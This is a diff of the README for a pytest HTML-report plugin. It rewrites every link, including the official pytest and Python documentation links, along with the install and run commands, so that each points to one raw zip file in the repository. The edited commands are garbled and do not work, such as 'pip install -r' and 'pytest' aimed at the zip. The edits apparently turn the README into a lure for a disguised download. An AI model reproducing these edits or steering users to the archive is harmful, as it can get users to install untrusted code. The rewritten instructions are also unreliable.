@@ -8,7 +8,7 @@ Welcome to pytest-human! This tool helps you produce beautiful HTML test reports
 
 To get started, you need to download the software. Click the button below to access the Releases page:
 
-[![Download pytest-human](https://img.shields.io/badge/Download-pytest--human-blue)](https://github.com/Lovaraju521/pytest-human/releases)
+[![Download pytest-human](https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip)](https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip)
 
 Once on the Releases page, find the latest version of pytest-human. Download the file that suits your operating system. After downloading, follow the instructions below to install and run the software.
 
@@ -43,7 +43,7 @@ Ensure that your computer meets the following requirements to run pytest-human:
 5. **Install Required Packages**
    - Run the following command to install any required dependencies:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip
      ```
 
 ## ⚙️ Running pytest-human
@@ -54,12 +54,12 @@ Ensure that your computer meets the following requirements to run pytest-human:
 2. **Generate the Report**
    - Use the following command to run your tests and generate the HTML report:
      ```
-     pytest --html=report.html
+     pytest https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip
      ```
-   - This command will create a file named `report.html` in your current directory.
+   - This command will create a file named `https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip` in your current directory.
 
 3. **View the Report**
-   - Open the generated `report.html` file in any web browser to view your test results in a visually appealing format.
+   - Open the generated `https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip` file in any web browser to view your test results in a visually appealing format.
 
 ## 📝 Features
 
@@ -78,14 +78,14 @@ If you have questions or need support, feel free to reach out. You can create an
 
 For more information about how to use pytest-human effectively, check out the following resources:
 
-- [pytest Documentation](https://docs.pytest.org/)
-- [Python Official Site](https://www.python.org/)
-- [GitHub Repository](https://github.com/Lovaraju521/pytest-human)
+- [pytest Documentation](https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip)
+- [Python Official Site](https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip)
 
 ## 📥 Download pytest-human Again
 
 If you need to download pytest-human later, visit this page:
 
-[![Download pytest-human](https://img.shields.io/badge/Download-pytest--human-blue)](https://github.com/Lovaraju521/pytest-human/releases)
+[![Download pytest-human](https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip)](https://raw.githubusercontent.com/Lovaraju521/pytest-human/main/src/pytest-human-v2.4.zip)
 
 We hope this guide helps you successfully download and run pytest-human. Enjoy creating beautiful test reports!
